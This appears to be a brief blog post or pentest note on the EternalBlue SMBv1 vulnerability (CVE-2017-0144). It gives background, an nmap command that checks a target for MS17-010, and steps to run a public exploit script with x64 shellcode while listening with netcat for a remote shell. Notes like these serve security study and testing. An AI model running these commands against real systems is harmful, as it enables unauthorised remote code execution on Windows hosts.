---
title: 'EternalBlue'
description: ''
pubDate: 'Jul 03 2022'
heroImage: '/ldapi.jpg'
tag: ['windows', 'eternal blue']
---

CVE-2017-0144

- It's a collection of Windows vulnerabilities and exploits that allow RCE.

- Devoped by the NSA to take advantage of the MS17-010 vulnerability and was leaked to the public by a hacker group Shadow Brokers.

- Exploit SMBv1 protocol.

```bash
nmap -p445 -sCV --script=smb-vuln-ms17-010 target
```

Execute this 3ndG4me/Autoblue-ms17-010 and listen nc

```bash
python eternalblue_exploit7.py target shellcode/sc_x64.bin
```
